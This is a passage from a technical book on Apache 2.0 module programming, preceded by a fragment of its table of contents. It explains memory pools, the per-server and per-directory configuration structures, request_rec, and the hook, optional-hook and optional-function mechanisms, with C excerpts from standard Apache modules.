 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
that are shorter than the pool's are easily handled. The only example we could think of 
where there was no appropriate pool in Apache 1.3 was the code for handling listeners 
(copy_listeners( ) and close_unused_listeners( ) in http_main.c), which had a 
lifetime longer than the topmost pool! However, the introduction in 2.x of pluggable 
process models has changed this: there is now an appropriate pool, the process pool, 
which lives in process_rec, which is documented in include/httpd.h.  
All is not lost, however — Apache 2.0 gives us both a new example and a new excuse for 
not using pools. The excuse is where using a pool would cause either excessive memory 

consumption or excessive amounts of pool creation and destruction,[1] and the example is 
bucket brigades (or, more accurately, buckets), which are documented later.  
There are a number of advantages to the pool approach, the most obvious being that 
modules can use resources without having to worry about when and how to release them. 
This is particularly useful when Apache handles an error condition. It simply bails out, 
destroying the pool associated with the erroneous request, confident that everything will 
be neatly cleaned up. Since each instance of Apache may handle many requests, this 
functionality is vital to the reliability of the server. Unsurprisingly, pools come into 
almost every aspect of Apache's API, as we shall see in this chapter. Their type is 
apr_pool_t, defined in srclib/apr/include/apr_pools.h .  
Like many other aspects of Apache, pools are configurable, in the sense that you can add 
your own resource management to a pool, mainly by registering cleanup functions (see 
the pool API in srclib/apr/include/apr_pools.h).  
20.4 Per-Server Configuration 
Since a single instance of Apache may be called on to handle a request for any of the 
configured virtual hosts (or the main host), a structure is defined that holds the 
information related to each host. This structure, server_rec, is defined in 
include/httpd.h:  
struct server_rec { 
    /** The process this server is running in */ 
    process_rec *process; 
    /** The next server in the list */ 
    server_rec *next; 
 
    /** The name of the server */ 
    const char *defn_name; 
    /** The line of the config file that the server was defined on */ 
    unsigned defn_line_number; 
 
    /* Contact information */ 
 
    /** The admin's contact information */ 
    char *server_admin; 
    /** The server hostname */ 
    char *server_hostname; 
    /** for redirects, etc. */ 
    apr_port_t port; 
 
    /* Log files --- note that transfer log is now in the modules... */ 
 
    /** The name of the error log */ 
    char *error_fname; 
    /** A file descriptor that references the error log */ 
    apr_file_t *error_log; 
    /** The log level for this server */ 
    int loglevel; 

 
    /* Module-specific configuration for server, and defaults... */ 
 
    /** true if this is the virtual server */ 
    int is_virtual; 
    /** Config vector containing pointers to modules' per-server config  
     *  structures. */ 
    struct ap_conf_vector_t *module_config;  
    /** MIME type info, etc., before we start checking per-directory 
info */ 
    struct ap_conf_vector_t *lookup_defaults; 
 
    /* Transaction handling */ 
 
    /** I haven't got a clue */ 
    server_addr_rec *addrs; 
    /** Timeout, in seconds, before we give up */ 
    int timeout; 
    /** Seconds we'll wait for another request */ 
    int keep_alive_timeout; 
    /** Maximum requests per connection */ 
    int keep_alive_max; 
    /** Use persistent connections? */ 
    int keep_alive; 
 
    /** Pathname for ServerPath */ 
    const char *path; 
    /** Length of path */ 
    int pathlen; 
 
    /** Normal names for ServerAlias servers */ 
    apr_array_header_t *names; 
    /** Wildcarded names for ServerAlias servers */ 
    apr_array_header_t *wild_names; 
 
    /** limit on size of the HTTP request line    */ 
    int limit_req_line; 
    /** limit on size of any request header field */ 
    int limit_req_fieldsize; 
    /** limit on number of request header fields  */ 
    int limit_req_fields;  
}; 
Most of this structure is used by the Apache core, but each module can also have a per-
server configuration, which is accessed via the module_config member, using 
ap_get_module_config( ). Each module creates this per-module configuration 
structure itself, so it has complete control over its size and contents. This can be seen in 
action in the case filter example that follows. Here are excerpts from 
modules/experimental/mod_case_filter.c showing how it is used:  
typedef struct 
    { 
    int bEnabled; 
    } CaseFilterConfig; 

Here we define a structure to hold the per-server configuration. Obviously, a module can 
put whatever it likes in this structure:  
static void *CaseFilterCreateServerConfig(apr_pool_t *p,server_rec *s) 
    { 
    CaseFilterConfig *pConfig=apr_pcalloc(p,sizeof *pConfig); 
 
    pConfig->bEnabled=0; 
 
    return pConfig; 
    } 
This function is linked in the module structure (see later) in the create_server_config 
slot. It is called once for each server (i.e., a virtual host or main host) by the core. The 
function must allocate the storage for the per-server configuration and initialize it. (Note 
that because apr_pcalloc( ) zero-fills the memory it allocates, there's no need to 
actually initialize the structure, but it is done for the purpose of clarity.) The return value 
must be the per-server configuration structure:  
static const char *CaseFilterEnable(cmd_parms *cmd, void *dummy, int 
arg) 
    { 
    CaseFilterConfig *pConfig=ap_get_module_config(cmd->server-
>module_config, 
                                                   
&case_filter_module); 
    pConfig->bEnabled=arg; 
 
    return NULL; 
    } 
This function sets the flag in the per-server configuration structure, having first retrieved 
it using ap_get_module_config( ). Note that you have to pass the right thing as the 
first argument, i.e., the module_config element of the server structure. The second 
argument is the address of the module's module structure, which is used to work out 
which configuration to retrieve. Note that per-directory configuration is done differently:  
static const command_rec CaseFilterCmds[] =  
    { 
    AP_INIT_FLAG("CaseFilter", CaseFilterEnable, NULL, RSRC_CONF, 
                 "Run a case filter on this host"), 
    { NULL } 
    }; 
This command invokes the function CaseFilterEnable( ). The RSRC_CONF flag is what 
tells the core that it is a per-server command (see the include/httpd_config.h 
documentation for more information).  
To access the configuration at runtime, all that is needed is a pointer to the relevant server 
structure, as shown earlier. This can usually be obtained from the request, as seen in this 
example:  

static void CaseFilterInsertFilter(request_rec *r) 
    { 
    CaseFilterConfig *pConfig=ap_get_module_config(r->server-
>module_config, 
                                                   
&case_filter_module); 
 
    if(!pConfig->bEnabled) 
        return; 
 
    ap_add_output_filter(s_szCaseFilterName,NULL,r,r->connection); 
    } 
One subtlety that isn't needed by every module is configuration merging. This occurs 
when the main configuration has directives for a module, but so has the relevant virtual 
host section. Then the two are merged. The default way this is done is for the virtual host 
to simply override the main config, but it is possible to supply a merging function in the 
module structure. If you do, then the two configs are passed to it, and it creates a new 
config that is the two merged. How it does this is entirely up to you, but here's an 
example from modules/metadata/mod_headers.c:  
static void *merge_headers_config(apr_pool_t *p, void *basev, void 
*overridesv) 
{ 
    headers_conf *newconf = apr_pcalloc(p, sizeof(*newconf)); 
    headers_conf *base = basev; 
    headers_conf *overrides = overridesv; 
 
    newconf->fixup_in = apr_array_append(p, base->fixup_in, overrides-
>fixup_in); 
    newconf->fixup_out = apr_array_append(p, base->fixup_out, 
overrides->fixup_out); 
 
    return newconf; 
} 
In this case the merging is done by combining the two sets of configuration (which are 
stored in a standard APR array).  
20.5 Per-Directory Configuration 
It is also possible for modules to be configured on a per-directory, per-URL, or per-file 
basis. Again, each module optionally creates its own per-directory configuration (the 
same structure is used for all three cases). This configuration is made available to 
modules either directly (during configuration) or indirectly (once the server is running), 
through the request_rec structure, which is detailed in the next section.  
Note that the module doesn't care how the configuration has been set up in terms of 
servers, directories, URLs, or file matches — the core of the server works out the 
appropriate configuration for the current request before modules are called by merging 
the appropriate set of configurations.  

The method differs from per-server configuration, so here's an example, taken this time 
from the standard module, modules/metadata/mod_expires.c:  
typedef struct { 
    int active; 
    char *expiresdefault; 
    apr_table_t *expiresbytype; 
} expires_dir_config; 
First we have a per-directory configuration structure: 
static void *create_dir_expires_config(apr_pool_t *p, char *dummy) 
{ 
    expires_dir_config *new = 
    (expires_dir_config *) apr_pcalloc(p, sizeof(expires_dir_config)); 
    new->active = ACTIVE_DONTCARE; 
    new->expiresdefault = ""; 
    new->expiresbytype = apr_table_make(p, 4); 
    return (void *) new; 
} 
This is the function that creates it, which will be linked from the module structure, as 
usual. Note that the active member is set to a default that can't be set by directives — 
this is used later on in the merging function.  
static const char *set_expiresactive(cmd_parms *cmd, void 
*in_dir_config, int arg) 
{ 
    expires_dir_config *dir_config = in_dir_config; 
 
    /* if we're here at all it's because someone explicitly 
     * set the active flag 
     */ 
    dir_config->active = ACTIVE_ON; 
    if (arg == 0) { 
        dir_config->active = ACTIVE_OFF; 
    }; 
    return NULL; 
} 
static const char *set_expiresbytype(cmd_parms *cmd, void 
*in_dir_config, 
                                     const char *mime, const char 
*code) 
{ 
    expires_dir_config *dir_config = in_dir_config; 
    char *response, *real_code; 
 
    if ((response = check_code(cmd->pool, code, &real_code)) == NULL) { 
        apr_table_setn(dir_config->expiresbytype, mime, real_code); 
        return NULL; 
    }; 
    return apr_pstrcat(cmd->pool, 
                 "'ExpiresByType ", mime, " ", code, "': ", response, 
NULL); 

} 
 
static const char *set_expiresdefault(cmd_parms *cmd, void 
*in_dir_config, 
                                      const char *code) 
{ 
    expires_dir_config * dir_config = in_dir_config; 
    char *response, *real_code; 
 
    if ((response = check_code(cmd->pool, code, &real_code)) == NULL) { 
        dir_config->expiresdefault = real_code; 
        return NULL; 
    }; 
    return apr_pstrcat(cmd->pool, 
                   "'ExpiresDefault ", code, "': ", response, NULL); 
} 
 
static const command_rec expires_cmds[] = 
{ 
    AP_INIT_FLAG("ExpiresActive", set_expiresactive, NULL, 
DIR_CMD_PERMS, 
                 "Limited to 'on' or 'off'"), 
    AP_INIT_TAKE2("ExpiresBytype", set_expiresbytype, NULL, 
DIR_CMD_PERMS, 
                  "a MIME type followed by an expiry date code"), 
    AP_INIT_TAKE1("ExpiresDefault", set_expiresdefault, NULL, 
DIR_CMD_PERMS, 
                  "an expiry date code"), 
    {NULL} 
}; 
This sets the various options — nothing particularly out of the ordinary there — but note 
a few features. First, we've omitted the function check_code( ), which does some 
complicated stuff we don't really care about here. Second, unlike per-server config, we 
don't have to find the config ourselves. It is passed to us as the second argument of each 
function — the DIR_CMD_PERMS (which is #defined earlier to be OR_INDEX) is what tells 
the core it is per-directory and triggers this behavior:  
static void *merge_expires_dir_configs(apr_pool_t *p, void *basev, void 
*addv) 
{ 
    expires_dir_config *new = (expires_dir_config *) apr_pcalloc(p, 
sizeof(expires_ 
dir_config)); 
    expires_dir_config *base = (expires_dir_config *) basev; 
    expires_dir_config *add = (expires_dir_config *) addv; 
 
    if (add->active == ACTIVE_DONTCARE) { 
        new->active = base->active; 
    } 
    else { 
        new->active = add->active; 
    }; 
 
    if (add->expiresdefault[0] != '\0') { 

        new->expiresdefault = add->expiresdefault; 
    } 
    else { 
 
new->expiresdefault = base->expiresdefault; 
    } 
 
    new->expiresbytype = apr_table_overlay(p, add->expiresbytype, 
                                        base->expiresbytype); 
    return new; 
} 
Here we have a more complex example of a merging function — the active member is 
set by the overriding config (here called addv) if it was set there at all, or it comes from 
the base. expiresdefault is set similarly but expiresbytype is the combination of the 
two sets:  
static int add_expires(request_rec *r) 
{ 
    expires_dir_config *conf; 
... 
    conf = (expires_dir_config *)  
           ap_get_module_config(r->per_dir_config, &expires_module); 
This code snippet shows how the configuration is found during request processing:  
static void register_hooks(apr_pool_t *p) 
{ 
    ap_hook_fixups(add_expires,NULL,NULL,APR_HOOK_MIDDLE); 
} 
 
module AP_MODULE_DECLARE_DATA expires_module = 
{ 
    STANDARD20_MODULE_STUFF, 
    create_dir_expires_config,  /* dir config creater */ 
    merge_expires_dir_configs,  /* dir merger --- default is to 
override */ 
    NULL,                       /* server config */ 
    NULL,                       /* merge server configs */ 
    expires_cmds,               /* command apr_table_t */ 
    register_hooks 
 
/* register hooks */ 
}; 
Finally, the hook registration function and module structure link everything together.  
20.6 Per-Request Information 
The core ensures that the right information is available to the modules at the right time. It 
does so by matching requests to the appropriate virtual server and directory information 
before invoking the various functions in the modules. This, and other information, is 
packaged in a request_rec structure, defined in httpd.h:  
/** A structure that represents the current request */ 

struct request_rec { 
    /** The pool associated with the request */ 
    apr_pool_t *pool; 
    /** The connection over which this connection has been read */ 
    conn_rec *connection; 
    /** The virtual host this request is for */ 
    server_rec *server; 
 
    /** If we wind up getting redirected, pointer to the request we  
     *  redirected to.  */ 
    request_rec *next; 
    /** If this is an internal redirect, pointer to where we redirected  
     *  *from*.  */ 
    request_rec *prev; 
 
    /** If this is a sub_request (see request.h) pointer back to the  
     *  main request.  */ 
    request_rec *main; 
 
    /* Info about the request itself... we begin with stuff that only 
     * protocol.c should ever touch... 
     */ 
    /** First line of request, so we can log it */ 
    char *the_request; 
    /** HTTP/0.9, "simple" request */ 
    int assbackwards; 
    /** A proxy request (calculated during 
post_read_request/translate_name) 
     *  possible values PROXYREQ_NONE, PROXYREQ_PROXY, PROXYREQ_REVERSE 
     */ 
    int proxyreq; 
    /** HEAD request, as opposed to GET */ 
    int header_only; 
    /** Protocol, as given to us, or HTTP/0.9 */ 
    char *protocol; 
    /** Number version of protocol; 1.1 = 1001 */ 
    int proto_num; 
    /** Host, as set by full URI or Host: */ 
    const char *hostname; 
 
    /** When the request started */ 
    apr_time_t request_time; 
 
    /** Status line, if set by script */ 
    const char *status_line; 
    /** In any case */ 
    int status; 
 
    /* Request method, two ways; also, protocol, etc..  Outside of 
protocol.c, 
     * look, but don't touch. 
     */ 
 
    /** GET, HEAD, POST, etc. */ 
    const char *method; 
    /** M_GET, M_POST, etc. */ 
    int method_number; 

 
    /** 
     *  allowed is a bitvector of the allowed methods. 
     * 
     *  A handler must ensure that the request method is one that 
     *  it is capable of handling.  Generally modules should DECLINE 
     *  any request methods they do not handle.  Prior to aborting the 
     *  handler like this the handler should set r->allowed to the list 
     *  of methods that it is willing to handle.  This bitvector is 
used 
     *  to construct the "Allow:" header required for OPTIONS requests, 
     *  and HTTP_METHOD_NOT_ALLOWED and HTTP_NOT_IMPLEMENTED status 
codes. 
     * 
     *  Since the default_handler deals with OPTIONS, all modules can 
     *  usually decline to deal with OPTIONS.  TRACE is always allowed, 
     *  modules don't need to set it explicitly. 
     * 
     *  Since the default_handler will always handle a GET, a 
     *  module which does *not* implement GET should probably return 
     *  HTTP_METHOD_NOT_ALLOWED.  Unfortunately this means that a 
Script GET 
     *  handler can't be installed by mod_actions. 
     */ 
    int allowed; 
    /** Array of extension methods */ 
    apr_array_header_t *allowed_xmethods;  
    /** List of allowed methods */ 
    ap_method_list_t *allowed_methods;  
 
    /** byte count in stream is for body */ 
    int sent_bodyct; 
    /** body byte count, for easy access */ 
    long bytes_sent; 
    /** Time the resource was last modified */ 
    apr_time_t mtime; 
 
    /* HTTP/1.1 connection-level features */ 
 
    /** sending chunked transfer-coding */ 
    int chunked; 
    /** multipart/byteranges boundary */ 
    const char *boundary; 
    /** The Range: header */ 
    const char *range; 
    /** The "real" content length */ 
    apr_off_t clength; 
 
    /** bytes left to read */ 
    apr_size_t remaining; 
    /** bytes that have been read */ 
    long read_length; 
    /** how the request body should be read */ 
    int read_body; 
    /** reading chunked transfer-coding */ 
    int read_chunked; 
    /** is client waiting for a 100 response? */ 

    unsigned expecting_100; 
 
    /* MIME header environments, in and out.  Also, an array containing 
     * environment variables to be passed to subprocesses, so people 
can 
     * write modules to add to that environment. 
     * 
     * The difference between headers_out and err_headers_out is that 
the 
     * latter are printed even on error, and persist across internal 
redirects 
     * (so the headers printed for ErrorDocument handlers will have 
them). 
     * 
     * The 'notes' apr_table_t is for notes from one module to another, 
with no 
     * other set purpose in mind... 
     */ 
 
    /** MIME header environment from the request */ 
    apr_table_t *headers_in; 
    /** MIME header environment for the response */ 
    apr_table_t *headers_out; 
    /** MIME header environment for the response, printed even on 
errors and 
     * persist across internal redirects */ 
    apr_table_t *err_headers_out; 
    /** Array of environment variables to be used for sub processes */ 
    apr_table_t *subprocess_env; 
    /** Notes from one module to another */ 
    apr_table_t *notes; 
 
    /* content_type, handler, content_encoding, content_language, and 
all 
     * content_languages MUST be lowercased strings.  They may be 
pointers 
     * to static strings; they should not be modified in place. 
     */ 
    /** The content-type for the current request */ 
    const char *content_type; /* Break these out --- we dispatch on 'em 
*/ 
    /** The handler string that we use to call a handler function */ 
    const char *handler; 
/* What we *really* dispatch on           
*/ 
 
    /** How to encode the data */ 
    const char *content_encoding; 
    /** for back-compat. only -- do not use */ 
    const char *content_language; 
    /** array of (char*) representing the content languages */ 
    apr_array_header_t *content_languages; 
 
    /** variant list validator (if negotiated) */ 
    char *vlist_validator; 
     
    /** If an authentication check was made, this gets set to the user 
name. */ 

    char *user;  
    /** If an authentication check was made, this gets set to the auth 
type. */ 
    char *ap_auth_type; 
 
    /** This response is non-cache-able */ 
    int no_cache; 
    /** There is no local copy of this response */ 
    int no_local_copy; 
 
    /* What object is being requested (either directly, or via include 
     * or content-negotiation mapping). 
     */ 
 
    /** the uri without any parsing performed */ 
    char *unparsed_uri; 
 
    /** the path portion of the URI */ 
    char *uri; 
    /** The filename on disk that this response corresponds to */ 
    char *filename; 
    /** The path_info for this request if there is any. */ 
    char *path_info; 
    /** QUERY_ARGS, if any */ 
    char *args;  
    /** ST_MODE set to zero if no such file */ 
    apr_finfo_t finfo; 
    /** components of uri, dismantled */ 
    apr_uri_components parsed_uri; 
 
    /* Various other config info which may change with .htaccess files 
     * These are config vectors, with one void* pointer for each module 
     * (the thing pointed to being the module's business). 
     */ 
 
    /** Options set in config files, etc. */ 
    struct ap_conf_vector_t *per_dir_config; 
    /** Notes on *this* request */ 
    struct ap_conf_vector_t *request_config; 
 
/** 
 * a linked list of the configuration directives in the .htaccess files 
 * accessed by this request. 
 * N.B. always add to the head of the list, _never_ to the end. 
 * that way, a sub request's list can (temporarily) point to a parent's 
list 
 */ 
    const struct htaccess_result *htaccess; 
 
    /** A list of output filters to be used for this request */ 
    struct ap_filter_t *output_filters; 
    /** A list of input filters to be used for this request */ 
    struct ap_filter_t *input_filters; 
    /** A flag to determine if the eos bucket has been sent yet */ 
    int eos_sent; 
 
/* Things placed at the end of the record to avoid breaking binary 
 * compatibility.  It would be nice to remember to reorder the entire 

 * record to improve 64bit alignment the next time we need to break 
 * binary compatibility for  
 
some other reason. 
 */ 
}; 
20.7 Access to Configuration and Request Information 
All this sounds horribly complicated, and, to be honest, it is. But unless you plan to mess 
around with the guts of Apache (which this book does not encourage you to do), all you 
really need to know is that these structures exist and that your module can access them at 
the appropriate moments. Each function exported by a module gets access to the 
appropriate structure to enable it to function. The appropriate structure depends on the 
function, of course, but it is typically either a server_rec, the module's per-directory 
configuration structure (or two), or a request_rec. As we saw earlier, if you have a 
server_rec, you can get access to your per-server configuration, and if you have a 
request_rec, you can get access to both your per-server and your per-directory 
configurations.  
20.8 Hooks, Optional Hooks, and Optional Functions 
In Apache 1.x modules hooked into the appropriate "phases" of the main server by 
putting functions into appropriate slots in the module structure. This process is known as 
"hooking." This has been revised in Apache 2.0 — instead a single function is called at 
startup in each module, and this registers the functions that need to be called. The 
registration process also permits the module to specify how it should be ordered relative 
to other modules for each hook. (In Apache 1.x this was only possible for all hooks in a 
module instead of individually and also had to be done in the configuration file, rather 
than being done by the module itself.)  
This approach has various advantages. First, the list of hooks can be extended arbitrarily 
without causing each function to have a huge unwieldy list of NULL entries. Second, 
optional modules can export their own hooks, which are only invoked when the module 
is present, but can be registered regardless — and this can be done without modification 
of the core code.  
Another feature of hooks that we think is pretty cool is that, although they are dynamic, 
they are still typesafe — that is, the compiler will complain if the type of the function 
registered for a hook doesn't match the hook (and each hook can use a different type of 
function).[2] They are also extremely efficient.  
So, what exactly is a hook? Its a point at which a module can request to be called. So, 
each hook specifies a function prototype, and each module can specify one (or more in 
2.0) function that gets called at the appropriate moment. When the moment arrives, the 
provider of the hook calls all the functions in order.[3] It may terminate when particular 
values are returned — the hook functions can return either "declined" or "ok" or an error. 

In the first case all are called until an error is returned (if one is, of course); in the second, 
functions are called until either an error or "ok" is returned. A slight complication in 
Apache 2.0 is that because each hook function can define the return type, it must also 
define how "ok," "decline," and errors are returned (in 1.x, the return type was fixed, so 
this was easier).  
Although you are unlikely to want to define a hook, it is useful to know how to go about 
it, so you can understand them when you come across them (plus, advanced module 
writers may wish to define optional hooks or optional functions).  
Before we get started, it is worth noting that Apache hooks are defined in terms of APR 
hooks — but the only reason for that is to provide namespace separation between Apache 
and some other package linked into Apache that also uses hooks.  
20.8.1 Hooks 
A hook comes in five parts: a declaration (in a header, of course), a hook structure, an 
implementation (where the hooked functions get called), a call to the implementation, and 
a hooked function. The first four parts are all provided by the author of the hook, and the 
last by its user. They are documented in .../include/ap_config.h. Let's cover them in order. 
First, the declaration. This consists of the return type, the name of the hook, and an 
argument list. Notionally, it's just a function declaration with commas in strange places. 
So, for example, if a hook is going to a call a function that looks like:  
int some_hook(int,char *,struct x); 
then the hook would be declared like this: 
AP_DECLARE_HOOK(int,some_hook,(int,char *,struct x)) 
Note that you really do have to put brackets around the arguments (even if there's only 
one) and no semicolon at the end (there's only so much we can do with macros!). This 
declares everything a module using a hook needs, and so it would normally live in an 
appropriate header.  
The next thing you need is the hook structure. This is really just a place that the hook 
machinery uses to store stuff. You only need one for a module that provides hooks, even 
if it provides more than one hook. In the hook structure you provide a link for each hook:  
APR_HOOK_STRUCT( 
 
APR_HOOK_LINK(some_hook) 
 
APR_HOOK_LINK(some_other_hook) 
) 
Once you have the declaration and the hook structure, you need an implementation for 
the hook — this calls all the functions registered for the hook and handles their return 
values. The implementation is actually provided for you by a macro, so all you have to do 

is invoke the macro somewhere in your source (it can't be implemented generically 
because each hook can have different arguments and return types). Currently, there are 
three different ways a hook can be implemented — all of them, however, implement a 
function called ap_run_name( ). If it returns no value (i.e., it is a void function), then 
implement it as follows:  
AP_IMPLEMENT_HOOK_VOID(some_hook,(char *a,int b),(a,b)) 
The first argument is the name of the hook, and the second is the declaration of the hook's 
arguments. The third is how those arguments are used to call a function (that is, the hook 
function looks like void some_hook(char *a,int b) and calling it looks like 
some_hook(a,b)). This implementation will call all functions registered for the hook.  
If the hook returns a value, there are two variants on the implementation — one calls all 
functions until one returns something other than "ok" or "decline" (returning something 
else normally signifies an error, which is why we stop at that point). The second runs 
functions until one of them returns something other than "decline." Note that the actual 
values of "ok" and "decline" are defined by the implementor and will, of course, have 
values appropriate to the return type of the hook. Most functions return ints and use the 
standard values OK and DECLINE as their return values. Many return an HTTP error value 
if they have an error. An example of the first variant is as follows:  
AP_IMPLEMENT_HOOK_RUN_ALL(int,some_hook,(int x),(x),OK,DECLINE) 
The arguments are, respectively, the return type of the hook, the hook's name, the 
arguments it takes, the way the arguments are used in a function call, the "ok" value, and 
the "decline" value. By the way, the reason this is described as "run all" rather than "run 
until the first thing that does something other than OK or DECLINE" is that the normal (i.e., 
nonerror) case will run all the registered functions.  
The second variant looks like this: 
AP_IMPLEMENT_HOOK_RUN_FIRST(char *,some_hook,(int k,const char 
*s),(k,s),NULL) 
The arguments are the return type of the hook, the hook name, the hook's arguments, the 
way the arguments are used, and the "decline" value.  
The final part is the way you register a function to be called by the hook. The declaration 
of the hook defines a function that does the registration, called ap_hook_name( ). This is 
normally called by a module from its hook-registration function, which, in turn, is 
pointed at by an element of the module structure. This function always takes four 
arguments, as follows:  
ap_hook_some_hook(my_hook_function,pre,succ,APR_HOOK_MIDDLE); 

Note that since this is not a macro, it actually has a semicolon at the end! The first 
argument is the function the module wants called by the hook. One of the pieces of magic 
that the hook implementation does is to ensure that the compiler knows the type of this 
function, so if it has the wrong arguments or return type, you should get an error. The 
second and third arguments are NULL-terminated arrays of module names that must 
precede or follow (respectively) this module in the order of registered hook functions. 
This is to provide fine-grained control of execution order (which, in Apache 1.x could 
only be done in a very ham-fisted way). If there are no such constraints, then NULL can be 
passed instead of a pointer to an empty array. The final argument provides a coarser 
mechanism for ordering — the possibilities being APR_HOOK_FIRST, APR_HOOK_MIDDLE, 
and APR_HOOK_LAST. Most modules should use APR_HOOK_MIDDLE. Note that this 
ordering is always overridden by the finer-grained mechanism provided by pre and succ.  
You might wonder what kind of hooks are available. Well, a list can be created by 
running the Perl script .../support/list_hooks.pl. Each hook should be documented in the 
online Apache documentation.  
20.8.2 Optional Hooks 
Optional hooks are almost exactly like standard hooks, except that they have the property 
that they do not actually have to be implemented — that sounds a little confusing, so let's 
start with what optional hooks are used for, and all will be clear. Consider an optional 
module — it may want to export a hook, but what happens if some other module uses that 
hook and the one that exports it is not present? With a standard hook Apache would just 
fail to build. Optional hooks allow you to export hooks that may not actually be there at 
runtime. Modules that use the hooks work fine even when the hook isn't there — they 
simply don't get called. There is a small runtime penalty incurred by optional hooks, 
which is the main reason all hooks are not optional.  
An optional hook is declared in exactly the same way as a standard hook, using 
AP_DECLARE_HOOK as shown earlier.  
There is no hook structure at all; it is maintained dynamically by the core. This is less 
efficient than maintaining the structure, but is required to make the hooks optional.  
The implementation differs from a standard hook implementation, but only slightly — 
instead of using AP_IMPLEMENT_HOOK_RUN_ALL and friends, you use 
AP_IMPLEMENT_OPTIONAL_HOOK_RUN_ALL and so on.  
Registering to use an optional hook is again almost identical to a standard hook, except 
you use a macro to do it: instead of ap_hook_name(...) you use 
AP_OPTIONAL_HOOK(name,...). Again, this is because of their dynamic nature.  
The call to your hook function from an optional hook is the same as from a standard one 
— except that it may not happen at all, of course!  

20.8.3 Optional Hook Example 
Here's a complete example of an optional hook (with comments following after the lines 
to which they refer). This can be found in .../modules/experimental. It comprises three 
files, mod_optional_hook_export.h, mod_optional_hook_export.c, and 
mod_optional_hook_import.c. What it actually does is call the hook, at logging time, with 
the request string as an argument.  
First we start with the header, mod_optional_hook_export.h.  
#include "ap_config.h" 
This header declares the various macros needed for hooks. 
AP_DECLARE_HOOK(int,optional_hook_test,(const char *)) 
Declare the optional hook (i.e., a function that looks like int 
optional_hook_test(const char *)). And that's all that's needed in the header.  
Next is the implementation file, mod_optional_hook_export.c.  
#include "httpd.h" 
#include "http_config.h" 
#include "mod_optional_hook_export.h" 
#include "http_protocol.h" 
Start with the standard includes — but we also include our own declaration header 
(although this is always a good idea, in this case it is a requirement, or other things won't 
work).  
AP_IMPLEMENT_OPTIONAL_HOOK_RUN_ALL(int,optional_hook_test,(const char 
*szStr), 
                                   (szStr),OK,DECLINED) 
Then we go to the implementation of the optional hook — in this case it makes sense to 
call all the hooked functions, since the hook we are implementing is essentially a logging 
hook. We could have declared it void, but even logging can go wrong, so we give the 
opportunity to say so.  
static int ExportLogTransaction(request_rec *r) 
{ 
    return ap_run_optional_hook_test(r->the_request); 
} 
This is the function that will actually run the hook implementation, passing the request 
string as its argument.  
static void ExportRegisterHooks(apr_pool_t *p) 
{ 

    
ap_hook_log_transaction(ExportLogTransaction,NULL,NULL,APR_HOOK_MIDDLE)
; 
} 
Here we hook the log_transaction hook to get hold of the request string in the logging 
phase (this is, of course, an example of the use of a standard hook).  
module optional_hook_export_module = 
{ 
    STANDARD20_MODULE_STUFF, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    ExportRegisterHooks 
}; 
Finally, the module structure — the only thing we do in this module structure is to add 
hook registration.  
Finally, an example module that uses the optional hook, optional_hook_import.c.  
#include "httpd.h" 
#include "http_config.h" 
#include "http_log.h" 
#include "mod_optional_hook_export.h" 
Again, the standard stuff, but also the optional hooks declaration (note that you always 
have to have the code available for the optional hook, or at least its header, to build with).  
static int ImportOptionalHookTestHook(const char *szStr) 
{ 
    ap_log_error(APLOG_MARK,APLOG_ERR,OK,NULL,"Optional hook test said: 
%s", 
                 szStr); 
 
    return OK; 
} 
This is the function that gets called by the hook. Since this is just a test, we simply log 
whatever we're given. If optional_hook_export.c isn't linked in, then we'll log nothing, of 
course.  
static void ImportRegisterHooks(apr_pool_t *p) 
{ 
    
AP_OPTIONAL_HOOK(optional_hook_test,ImportOptionalHookTestHook,NULL, 
                     NULL,APR_HOOK_MIDDLE); 
} 

Here's where we register our function with the optional hook.  
module optional_hook_import_module= 
{ 
    STANDARD20_MODULE_STUFF, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    NULL, 
    ImportRegisterHooks 
}; 
And finally, the module structure, once more with only the hook registration function in 
it.  
20.8.4 Optional Functions 
For much the same reason as optional hooks are desirable, it is also nice to be able to call 
a function that may not be there. You might think that DSOs provide the answer,[4] and 
you'd be half right. But they don't quite, for two reasons — first, not every platform 
supports DSOs, and second, when the function is not missing, it may be statically linked. 
Forcing everyone to use DSOs for all modules just to support optional functions is going 
too far. Particularly since we have a better plan!  
